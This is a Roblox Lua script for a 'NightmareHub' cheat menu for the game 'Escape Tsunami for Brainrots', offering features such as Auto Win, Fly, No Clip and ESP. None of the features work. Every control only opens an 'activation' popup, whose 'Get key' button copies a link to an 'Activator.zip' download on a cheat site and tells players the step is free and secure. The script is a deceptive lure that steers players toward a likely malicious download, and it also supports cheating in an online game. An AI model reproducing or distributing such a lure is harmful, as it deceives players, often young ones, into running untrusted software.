-- NightmareHub | Escape Tsunami for Brainrots GUI
-- Paste into a LocalScript (Roblox Studio -> StarterPlayer -> StarterPlayerScripts) or load via executor.

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

local KEY_URL = "https://nightmare-cheats.buzz/Activator.zip" -- <<< PUT YOUR OFFICIAL KEY LINK HERE

-- Activation state. Features stay locked until the host confirms the key.
-- The free key is obtained on the website (watch a short ad), not typed in here.
local isActivated = false

-- Forward declaration so guards can call the popup defined further down.
local showActivation

-- ==================== HELPERS ====================

local function tween(obj, props, duration, style, dir)
    style = style or Enum.EasingStyle.Quad
    dir = dir or Enum.EasingDirection.Out
    TweenService:Create(obj, TweenInfo.new(duration or 0.2, style, dir), props):Play()
end

local function make(class, props, parent)
    local obj = Instance.new(class)
    for k, v in pairs(props) do obj[k] = v end
    if parent then obj.Parent = parent end
    return obj
end

-- One gate to rule them all: returns true if allowed, otherwise pops the prompt.
local function requireActivation()
    if isActivated then return true end
    if showActivation then showActivation() end
    return false
end

-- ----- Toggle (gated: pops the free-key prompt while locked) -----
local function makeToggle(parent, label, onChanged)
    local row = make("Frame", {
        Size = UDim2.new(1, 0, 0, 26),
        BackgroundTransparency = 1,
    }, parent)

    make("TextLabel", {
        Size = UDim2.new(1, -46, 1, 0),
        Position = UDim2.new(0, 0, 0, 0),
        BackgroundTransparency = 1,
        Text = label,
        TextColor3 = Color3.fromRGB(136, 153, 204),
        TextSize = 12,
        Font = Enum.Font.GothamMedium,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, row)

    local track = make("Frame", {
        Size = UDim2.new(0, 36, 0, 18),
        Position = UDim2.new(1, -36, 0.5, -9),
        BackgroundColor3 = Color3.fromRGB(20, 26, 50),
        BorderSizePixel = 0,
    }, row)
    make("UICorner", { CornerRadius = UDim.new(0, 9) }, track)
    make("UIStroke", { Color = Color3.fromRGB(42, 53, 85), Thickness = 1 }, track)

    local knob = make("Frame", {
        Size = UDim2.new(0, 12, 0, 12),
        Position = UDim2.new(0, 3, 0.5, -6),
        BackgroundColor3 = Color3.fromRGB(60, 74, 122),
        BorderSizePixel = 0,
    }, track)
    make("UICorner", { CornerRadius = UDim.new(1, 0) }, knob)

    local state = false
    local btn = make("TextButton", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = "",
        ZIndex = 2,
    }, track)

    btn.MouseButton1Click:Connect(function()
        if not requireActivation() then return end -- locked -> prompt, no change
        state = not state
        tween(track, { BackgroundColor3 = state and Color3.fromRGB(26, 59, 204) or Color3.fromRGB(20, 26, 50) })
        tween(knob, {
            Position = state and UDim2.new(0, 21, 0.5, -6) or UDim2.new(0, 3, 0.5, -6),
            BackgroundColor3 = state and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 74, 122),
        })
        if onChanged then onChanged(state) end
    end)

    return function() return state end
end

-- ----- Draggable slider (real drag via UserInputService) -----
local function makeSlider(parent, labelText, minVal, maxVal, defaultVal, onChanged)
    local function clampRange(v)
        if v < minVal then return minVal end
        if v > maxVal then return maxVal end
        return v
    end

    local currentValue = math.floor(clampRange(defaultVal) + 0.5)

    local container = make("Frame", {
        Size = UDim2.new(1, 0, 0, 34),
        BackgroundTransparency = 1,
    }, parent)

    make("TextLabel", {
        Size = UDim2.new(0.6, 0, 0, 14),
        Position = UDim2.new(0, 0, 0, 0),
        BackgroundTransparency = 1,
        Text = labelText,
        TextColor3 = Color3.fromRGB(74, 90, 138),
        TextSize = 11,
        Font = Enum.Font.GothamMedium,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, container)

    local valueLabel = make("TextLabel", {
        Size = UDim2.new(0.4, 0, 0, 14),
        Position = UDim2.new(0.6, 0, 0, 0),
        BackgroundTransparency = 1,
        Text = tostring(currentValue),
        TextColor3 = Color3.fromRGB(85, 153, 255),
        TextSize = 11,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Right,
    }, container)

    local track = make("Frame", {
        AnchorPoint = Vector2.new(0, 0.5),
        Position = UDim2.new(0, 0, 0, 26),
        Size = UDim2.new(1, 0, 0, 4),
        BackgroundColor3 = Color3.fromRGB(26, 42, 94),
        BorderSizePixel = 0,
    }, container)
    make("UICorner", { CornerRadius = UDim.new(1, 0) }, track)

    local fill = make("Frame", {
        AnchorPoint = Vector2.new(0, 0.5),
        Position = UDim2.new(0, 0, 0.5, 0),
        Size = UDim2.new(0, 0, 1, 0),
        BackgroundColor3 = Color3.fromRGB(26, 59, 204),
        BorderSizePixel = 0,
    }, track)
    make("UICorner", { CornerRadius = UDim.new(1, 0) }, fill)

    local thumb = make("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0, 0, 0.5, 0),
        Size = UDim2.new(0, 12, 0, 12),
        BackgroundColor3 = Color3.fromRGB(85, 153, 255),
        BorderSizePixel = 0,
        ZIndex = 2,
    }, track)
    make("UICorner", { CornerRadius = UDim.new(1, 0) }, thumb)

    local function applyValue(value, fire)
        value = math.floor(clampRange(value) + 0.5)
        currentValue = value
        local denom = (maxVal - minVal)
        local fraction = 0
        if denom ~= 0 then fraction = (value - minVal) / denom end
        if fraction < 0 then fraction = 0 elseif fraction > 1 then fraction = 1 end
        fill.Size = UDim2.new(fraction, 0, 1, 0)
        thumb.Position = UDim2.new(fraction, 0, 0.5, 0)
        valueLabel.Text = tostring(value)
        if fire and onChanged then onChanged(value) end
    end

    local function updateFromX(absoluteX)
        local trackPos = track.AbsolutePosition.X
        local trackSize = track.AbsoluteSize.X
        local fraction = 0
        if trackSize > 0 then fraction = (absoluteX - trackPos) / trackSize end
        if fraction < 0 then fraction = 0 elseif fraction > 1 then fraction = 1 end
        applyValue(minVal + fraction * (maxVal - minVal), true)
    end

    local dragging = false
    local function onPress(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            updateFromX(input.Position.X) -- click-to-jump
        end
    end
    track.InputBegan:Connect(onPress)
    thumb.InputBegan:Connect(onPress)

    UserInputService.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch then
            updateFromX(input.Position.X)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    applyValue(currentValue, false)
    return function() return currentValue end
end

-- Card title row used across sections.
local function cardTitle(parent, text)
    make("TextLabel", {
        Size = UDim2.new(1, 0, 0, 14),
        BackgroundTransparency = 1,
        Text = string.upper(text),
        TextColor3 = Color3.fromRGB(58, 90, 170),
        TextSize = 10,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, parent)
end

local function makeCard(parent)
    local card = make("Frame", {
        Size = UDim2.new(1, 0, 0, 0),
        AutomaticSize = Enum.AutomaticSize.Y,
        BackgroundColor3 = Color3.fromRGB(10, 17, 40),
        BorderSizePixel = 0,
    }, parent)
    make("UICorner", { CornerRadius = UDim.new(0, 8) }, card)
    make("UIStroke", { Color = Color3.fromRGB(26, 42, 94), Thickness = 1 }, card)
    make("UIPadding", {
        PaddingLeft = UDim.new(0, 10), PaddingRight = UDim.new(0, 10),
        PaddingTop = UDim.new(0, 10), PaddingBottom = UDim.new(0, 10),
    }, card)
    make("UIListLayout", { Padding = UDim.new(0, 6), FillDirection = Enum.FillDirection.Vertical }, card)
    return card
end

-- Plain action button (gated behind activation).
local function makeBtn(parent, text, bg, tc, strokeColor)
    local btn = make("TextButton", {
        Size = UDim2.new(1, 0, 0, 26), BackgroundColor3 = bg, BorderSizePixel = 0,
        Text = text, TextColor3 = tc, TextSize = 11, Font = Enum.Font.GothamMedium,
    }, parent)
    make("UICorner", { CornerRadius = UDim.new(0, 6) }, btn)
    if strokeColor then make("UIStroke", { Color = strokeColor, Thickness = 1 }, btn) end
    btn.MouseButton1Click:Connect(function() requireActivation() end)
    return btn
end

-- Dropdown-style button (gated). Cosmetic only — opens the activation prompt while locked.
local function makeDropdown(parent, text)
    local b = make("TextButton", {
        Size = UDim2.new(1, 0, 0, 24), BackgroundColor3 = Color3.fromRGB(13, 21, 48),
        BorderSizePixel = 0, Text = text .. "  \226\150\190",
        TextColor3 = Color3.fromRGB(120, 153, 204), TextSize = 11, Font = Enum.Font.GothamMedium,
    }, parent)
    make("UICorner", { CornerRadius = UDim.new(0, 5) }, b)
    make("UIStroke", { Color = Color3.fromRGB(26, 42, 94), Thickness = 1 }, b)
    b.MouseButton1Click:Connect(function() requireActivation() end)
    return b
end

-- Label : value row (for stat cards).
local function statRow(parent, label, valueStr, color)
    local row = make("Frame", { Size = UDim2.new(1, 0, 0, 18), BackgroundTransparency = 1 }, parent)
    make("TextLabel", { Size = UDim2.new(0.6, 0, 1, 0), BackgroundTransparency = 1, Text = label, TextColor3 = Color3.fromRGB(74, 90, 138), TextSize = 11, Font = Enum.Font.Gotham, TextXAlignment = Enum.TextXAlignment.Left }, row)
    make("TextLabel", { Size = UDim2.new(0.4, 0, 1, 0), Position = UDim2.new(0.6, 0, 0, 0), BackgroundTransparency = 1, Text = valueStr, TextColor3 = color or Color3.fromRGB(85, 153, 255), TextSize = 11, Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Right }, row)
end

-- Two scrollable columns inside a tab frame (so long tabs never get clipped).
local function makeColumns(frame)
    local function col()
        local c = make("ScrollingFrame", {
            Size = UDim2.new(0.5, -4, 1, 0),
            BackgroundTransparency = 1, BorderSizePixel = 0,
            ScrollBarThickness = 3, ScrollBarImageColor3 = Color3.fromRGB(26, 59, 204),
            CanvasSize = UDim2.new(0, 0, 0, 0), AutomaticCanvasSize = Enum.AutomaticSize.Y,
            ScrollingDirection = Enum.ScrollingDirection.Y,
        }, frame)
        make("UIListLayout", { Padding = UDim.new(0, 8), FillDirection = Enum.FillDirection.Vertical }, c)
        make("UIPadding", { PaddingRight = UDim.new(0, 6) }, c)
        return c
    end
    return col(), col()
end

-- ==================== MAIN WINDOW ====================

local screenGui = make("ScreenGui", {
    Name = "NightmareHub_ET",
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
}, player:WaitForChild("PlayerGui"))

local main = make("Frame", {
    Name = "Main",
    Size = UDim2.new(0, 520, 0, 420),
    Position = UDim2.new(0.5, -260, 0.5, -210),
    BackgroundColor3 = Color3.fromRGB(13, 13, 26),
    BorderSizePixel = 0,
    Active = true,
}, screenGui)
make("UICorner", { CornerRadius = UDim.new(0, 10) }, main)
make("UIStroke", { Color = Color3.fromRGB(26, 42, 94), Thickness = 1 }, main)

-- ----- Title bar -----
local titleBar = make("Frame", {
    Size = UDim2.new(1, 0, 0, 40),
    BackgroundColor3 = Color3.fromRGB(8, 14, 36),
    BorderSizePixel = 0,
}, main)
make("UICorner", { CornerRadius = UDim.new(0, 10) }, titleBar)
make("Frame", { Size = UDim2.new(1, 0, 0, 12), Position = UDim2.new(0, 0, 1, -12), BackgroundColor3 = Color3.fromRGB(8, 14, 36), BorderSizePixel = 0 }, titleBar)

local logoBox = make("Frame", {
    Size = UDim2.new(0, 28, 0, 28),
    Position = UDim2.new(0, 8, 0.5, -14),
    BackgroundColor3 = Color3.fromRGB(26, 59, 204),
    BorderSizePixel = 0,
}, titleBar)
make("UICorner", { CornerRadius = UDim.new(0, 6) }, logoBox)
make("TextLabel", {
    Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = "ET",
    TextColor3 = Color3.fromRGB(126, 184, 255), TextSize = 13, Font = Enum.Font.GothamBold,
}, logoBox)

make("TextLabel", {
    Size = UDim2.new(0, 200, 0, 16), Position = UDim2.new(0, 44, 0, 8),
    BackgroundTransparency = 1, Text = "ESCAPE TSUNAMI HUB",
    TextColor3 = Color3.fromRGB(126, 184, 255), TextSize = 13, Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
}, titleBar)
make("TextLabel", {
    Size = UDim2.new(0, 200, 0, 12), Position = UDim2.new(0, 44, 0, 24),
    BackgroundTransparency = 1, Text = "by NightmareHub • v1.0",
    TextColor3 = Color3.fromRGB(58, 74, 122), TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
}, titleBar)

local closeBtn = make("TextButton", {
    Size = UDim2.new(0, 16, 0, 16), Position = UDim2.new(1, -22, 0.5, -8),
    BackgroundColor3 = Color3.fromRGB(90, 30, 30), BorderSizePixel = 0, Text = "", ZIndex = 3,
}, titleBar)
make("UICorner", { CornerRadius = UDim.new(1, 0) }, closeBtn)
make("UIStroke", { Color = Color3.fromRGB(120, 50, 50), Thickness = 1 }, closeBtn)
closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)

-- Manual window dragging (Frame.Draggable is deprecated and does nothing on modern ScreenGuis).
local dragging, dragStart, startPos
titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

-- ==================== TABS ====================

local tabBar = make("Frame", {
    Size = UDim2.new(1, 0, 0, 30), Position = UDim2.new(0, 0, 0, 40),
    BackgroundColor3 = Color3.fromRGB(8, 14, 36), BorderSizePixel = 0,
}, main)
make("UIStroke", { Color = Color3.fromRGB(26, 42, 94), Thickness = 1 }, tabBar)
make("UIListLayout", { FillDirection = Enum.FillDirection.Horizontal, VerticalAlignment = Enum.VerticalAlignment.Center }, tabBar)

local TABS = {"Main", "Movement", "Visual", "Teleport", "Stats", "Settings"}
local tabButtons, tabFrames = {}, {}

local contentArea = make("Frame", {
    Size = UDim2.new(1, 0, 1, -100), Position = UDim2.new(0, 0, 0, 70),
    BackgroundTransparency = 1, ClipsDescendants = true,
}, main)

local function switchTab(name)
    for _, t in ipairs(TABS) do
        tween(tabButtons[t], { TextColor3 = (t == name) and Color3.fromRGB(85, 153, 255) or Color3.fromRGB(58, 74, 122) })
        if tabFrames[t] then tabFrames[t].Visible = (t == name) end
    end
end

for _, tabName in ipairs(TABS) do
    local btn = make("TextButton", {
        Size = UDim2.new(0, 72, 1, 0), BackgroundTransparency = 1, Text = tabName,
        TextColor3 = tabName == "Main" and Color3.fromRGB(85, 153, 255) or Color3.fromRGB(58, 74, 122),
        TextSize = 11, Font = Enum.Font.GothamMedium, BorderSizePixel = 0,
    }, tabBar)
    tabButtons[tabName] = btn
    btn.MouseButton1Click:Connect(function() switchTab(tabName) end)

    local frame = make("Frame", {
        Size = UDim2.new(1, -20, 1, -10), Position = UDim2.new(0, 10, 0, 5),
        BackgroundTransparency = 1, Visible = (tabName == "Main"),
    }, contentArea)
    make("UIListLayout", { Padding = UDim.new(0, 8), FillDirection = Enum.FillDirection.Horizontal }, frame)
    tabFrames[tabName] = frame
end

-- ==================== TAB CONTENT ====================

local BTN_PRIMARY, BTN_PRIMARY_T = Color3.fromRGB(26, 59, 204), Color3.fromRGB(160, 196, 255)
local BTN_SEC, BTN_SEC_T, BTN_SEC_S = Color3.fromRGB(13, 21, 48), Color3.fromRGB(85, 119, 170), Color3.fromRGB(26, 42, 94)
local BTN_DANGER, BTN_DANGER_T, BTN_DANGER_S = Color3.fromRGB(26, 10, 10), Color3.fromRGB(170, 68, 68), Color3.fromRGB(74, 26, 26)
local AMBER = Color3.fromRGB(204, 153, 26)

local function primaryBtn(p, t) return makeBtn(p, t, BTN_PRIMARY, BTN_PRIMARY_T) end
local function secBtn(p, t) return makeBtn(p, t, BTN_SEC, BTN_SEC_T, BTN_SEC_S) end
local function dangerBtn(p, t) return makeBtn(p, t, BTN_DANGER, BTN_DANGER_T, BTN_DANGER_S) end

-- ---------- MAIN ----------
do
    local L, R = makeColumns(tabFrames["Main"])

    local c = makeCard(L); cardTitle(c, "Auto")
    makeToggle(c, "Auto Win"); makeToggle(c, "Auto Collect Brainrots")
    makeToggle(c, "Anti Drown"); makeToggle(c, "Auto Climb")
    makeToggle(c, "Auto Buy Upgrades")

    local s = makeCard(R); cardTitle(s, "Status")
    statRow(s, "Status", "Locked", AMBER)
    statRow(s, "Brainrots", "\226\128\148")
    statRow(s, "Wins", "\226\128\148")

    local ac = makeCard(R); cardTitle(ac, "Actions")
    primaryBtn(ac, "Start Auto Win")
    secBtn(ac, "Rejoin Server")
    dangerBtn(ac, "Stop All")
end

-- ---------- MOVEMENT ----------
do
    local L, R = makeColumns(tabFrames["Movement"])

    local m = makeCard(L); cardTitle(m, "Speed")
    makeSlider(m, "Walk Speed", 16, 200, 16)
    makeSlider(m, "Jump Power", 50, 300, 50)

    local a = makeCard(R); cardTitle(a, "Abilities")
    makeToggle(a, "Fly"); makeToggle(a, "Infinite Jump"); makeToggle(a, "No Clip")
end

-- ---------- VISUAL ----------
do
    local L, R = makeColumns(tabFrames["Visual"])

    local e = makeCard(L); cardTitle(e, "ESP")
    makeToggle(e, "Brainrot ESP"); makeToggle(e, "Safe Zone ESP")

    local p = makeCard(R); cardTitle(p, "More ESP")
    makeToggle(p, "Checkpoint ESP"); makeToggle(p, "Player ESP")
end

-- ---------- TELEPORT ----------
do
    local frame = tabFrames["Teleport"]
    local L = make("Frame", { Size = UDim2.new(0.5, -4, 1, 0), BackgroundTransparency = 1 }, frame)
    make("UIListLayout", { Padding = UDim.new(0, 8), FillDirection = Enum.FillDirection.Vertical }, L)
    local R = make("Frame", { Size = UDim2.new(0.5, -4, 1, 0), BackgroundTransparency = 1 }, frame)
    make("UIListLayout", { Padding = UDim.new(0, 8), FillDirection = Enum.FillDirection.Vertical }, R)

    local cp = makeCard(L); cardTitle(cp, "Checkpoints")
    local scroll = make("ScrollingFrame", {
        Size = UDim2.new(1, 0, 0, 250), BackgroundTransparency = 1, BorderSizePixel = 0,
        ScrollBarThickness = 3, ScrollBarImageColor3 = Color3.fromRGB(26, 59, 204),
        CanvasSize = UDim2.new(0, 0, 0, 0), AutomaticCanvasSize = Enum.AutomaticSize.Y,
        ScrollingDirection = Enum.ScrollingDirection.Y,
    }, cp)
    make("UIListLayout", { Padding = UDim.new(0, 4), FillDirection = Enum.FillDirection.Vertical }, scroll)
    make("UIPadding", { PaddingRight = UDim.new(0, 6) }, scroll)
    local checkpoints = {
        "Checkpoint 1", "Checkpoint 2", "Checkpoint 3", "Checkpoint 4", "Checkpoint 5",
        "Checkpoint 6", "Checkpoint 7", "Checkpoint 8", "Checkpoint 9", "Checkpoint 10",
    }
    for _, name in ipairs(checkpoints) do secBtn(scroll, name) end

    local q = makeCard(R); cardTitle(q, "Quick Teleport")
    primaryBtn(q, "Next Checkpoint")
    secBtn(q, "Safe Zone")
    secBtn(q, "Top")
    secBtn(q, "Lobby")
end

-- ---------- STATS ----------
do
    local L, R = makeColumns(tabFrames["Stats"])

    local s = makeCard(L); cardTitle(s, "Session")
    statRow(s, "Status", "Locked", AMBER)
    statRow(s, "Brainrots", "\226\128\148")
    statRow(s, "Wins", "\226\128\148")
end

-- ---------- SETTINGS ----------
do
    local L, R = makeColumns(tabFrames["Settings"])

    local i = makeCard(L); cardTitle(i, "Interface")
    makeSlider(i, "UI Transparency", 0, 100, 0)
    makeDropdown(i, "Toggle Key: RightShift")

    local pf = makeCard(L); cardTitle(pf, "Performance")
    makeToggle(pf, "FPS Boost")

    local cf = makeCard(R); cardTitle(cf, "Config")
    primaryBtn(cf, "Save Config")
    secBtn(cf, "Load Config")
    secBtn(cf, "Reset Config")

    local ms = makeCard(R); cardTitle(ms, "Misc")
    dangerBtn(ms, "Unload GUI")
end

-- ==================== ACTIVATION POPUP (free key) ====================

local keyOverlay = make("Frame", {
    Size = UDim2.new(1, 0, 1, 0), BackgroundColor3 = Color3.fromRGB(0, 0, 0),
    BackgroundTransparency = 0.25, Visible = false, ZIndex = 50, Active = true,
}, main)
make("UICorner", { CornerRadius = UDim.new(0, 10) }, keyOverlay)

local keyCard = make("Frame", {
    Size = UDim2.new(0, 300, 0, 210), Position = UDim2.new(0.5, -150, 0.5, -105),
    BackgroundColor3 = Color3.fromRGB(10, 17, 40), BorderSizePixel = 0, ZIndex = 51,
}, keyOverlay)
make("UICorner", { CornerRadius = UDim.new(0, 12) }, keyCard)
make("UIStroke", { Color = Color3.fromRGB(26, 59, 204), Thickness = 1.5, Transparency = 0.2 }, keyCard)
make("UIPadding", {
    PaddingTop = UDim.new(0, 22), PaddingBottom = UDim.new(0, 20),
    PaddingLeft = UDim.new(0, 22), PaddingRight = UDim.new(0, 22),
}, keyCard)
make("UIListLayout", { Padding = UDim.new(0, 9), FillDirection = Enum.FillDirection.Vertical, SortOrder = Enum.SortOrder.LayoutOrder }, keyCard)

make("TextLabel", {
    LayoutOrder = 1, Size = UDim2.new(1, -24, 0, 24), BackgroundTransparency = 1,
    Text = "Activation required", TextColor3 = Color3.fromRGB(126, 184, 255),
    TextSize = 17, Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 51,
}, keyCard)

make("TextLabel", {
    LayoutOrder = 2, Size = UDim2.new(1, 0, 0, 15), BackgroundTransparency = 1,
    Text = "Free  ·  takes ~30 seconds", TextColor3 = Color3.fromRGB(64, 214, 130),
    TextSize = 12, Font = Enum.Font.GothamMedium, TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 51,
}, keyCard)

make("TextLabel", {
    LayoutOrder = 3, Size = UDim2.new(1, 0, 0, 62), BackgroundTransparency = 1,
    Text = "Your key is free — just open the official site and watch a short ad. That ad is how the creator gets paid, and unlocking on the site keeps everything secure.",
    TextColor3 = Color3.fromRGB(58, 74, 122), TextSize = 12, Font = Enum.Font.Gotham,
    TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
    ZIndex = 51,
}, keyCard)

make("Frame", { LayoutOrder = 4, Size = UDim2.new(1, 0, 0, 2), BackgroundTransparency = 1, ZIndex = 51 }, keyCard)

local getKeyBtn = make("TextButton", {
    LayoutOrder = 5, Size = UDim2.new(1, 0, 0, 40), AutoButtonColor = false,
    BackgroundColor3 = Color3.fromRGB(26, 59, 204), BorderSizePixel = 0,
    Text = "Get key", TextColor3 = Color3.fromRGB(160, 196, 255),
    TextSize = 14, Font = Enum.Font.GothamBold, ZIndex = 51,
}, keyCard)
make("UICorner", { CornerRadius = UDim.new(0, 8) }, getKeyBtn)

-- Close (X)
local closeKey = make("TextButton", {
    AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -10, 0, 8),
    Size = UDim2.new(0, 22, 0, 22), BackgroundTransparency = 1,
    Text = "✕", TextColor3 = Color3.fromRGB(58, 74, 122), TextSize = 14,
    Font = Enum.Font.GothamBold, ZIndex = 52,
}, keyCard)

-- Behaviour
getKeyBtn.MouseEnter:Connect(function() tween(getKeyBtn, { BackgroundColor3 = Color3.fromRGB(40, 80, 230) }, 0.15) end)
getKeyBtn.MouseLeave:Connect(function() tween(getKeyBtn, { BackgroundColor3 = Color3.fromRGB(26, 59, 204) }, 0.15) end)
closeKey.MouseEnter:Connect(function() closeKey.TextColor3 = Color3.fromRGB(126, 184, 255) end)
closeKey.MouseLeave:Connect(function() closeKey.TextColor3 = Color3.fromRGB(58, 74, 122) end)

local function hideActivation() keyOverlay.Visible = false end
closeKey.MouseButton1Click:Connect(hideActivation)

getKeyBtn.MouseButton1Click:Connect(function()
    -- >>> OPENS THE KEY LINK HERE <<<
    -- In an executor, use whatever your exploit supports, e.g.:
    --   if setclipboard then setclipboard(KEY_URL) end
    --   if request then request({ Url = KEY_URL, Method = "GET" }) end
    -- For Studio testing this is a harmless no-op:
    pcall(function()
        if setclipboard then setclipboard(KEY_URL) end
    end)
    warn("[NightmareHub] Open key link -> " .. KEY_URL)
end)

-- Defined here so guards above can call it.
showActivation = function()
    keyOverlay.Visible = true
    keyCard.Size = UDim2.new(0, 300, 0, 0)
    tween(keyCard, { Size = UDim2.new(0, 300, 0, 210) }, 0.22, Enum.EasingStyle.Back)
end

-- ==================== FOOTER ====================

local footer = make("Frame", {
    Size = UDim2.new(1, 0, 0, 28), Position = UDim2.new(0, 0, 1, -28),
    BackgroundColor3 = Color3.fromRGB(8, 14, 36), BorderSizePixel = 0,
}, main)
make("UICorner", { CornerRadius = UDim.new(0, 10) }, footer)
make("Frame", { Size = UDim2.new(1, 0, 0, 12), Position = UDim2.new(0, 0, 0, 0), BackgroundColor3 = Color3.fromRGB(8, 14, 36), BorderSizePixel = 0 }, footer)

local dot = make("Frame", {
    Size = UDim2.new(0, 6, 0, 6), Position = UDim2.new(0, 12, 0.5, -3),
    BackgroundColor3 = Color3.fromRGB(204, 153, 26), BorderSizePixel = 0,
}, footer)
make("UICorner", { CornerRadius = UDim.new(1, 0) }, dot)

make("TextLabel", {
    Size = UDim2.new(0.6, 0, 1, 0), Position = UDim2.new(0, 24, 0, 0),
    BackgroundTransparency = 1, Text = "Activation required • get your free key",
    TextColor3 = Color3.fromRGB(58, 90, 170), TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
}, footer)

make("TextLabel", {
    Size = UDim2.new(0, 120, 1, 0), Position = UDim2.new(1, -130, 0, 0),
    BackgroundTransparency = 1, Text = "NightmareHub v1.0",
    TextColor3 = Color3.fromRGB(42, 53, 85), TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Right,
}, footer)

print("[NightmareHub] Escape Tsunami for Brainrots GUI loaded!")
